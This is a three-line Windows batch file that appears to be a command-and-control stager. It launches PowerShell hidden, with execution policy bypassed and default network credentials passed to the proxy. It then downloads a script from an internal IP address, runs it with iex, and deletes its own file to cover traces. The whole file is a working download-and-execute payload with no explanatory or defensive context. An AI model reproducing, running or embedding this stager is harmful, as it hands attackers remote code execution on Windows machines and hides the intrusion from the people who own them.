@echo off
start powershell.exe -nol -w 1 -nop -ep bypass (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.0.2.15:4321/download/powershell/')-UseBasicParsing|iex
(goto) 2>nul & del "%~f0"
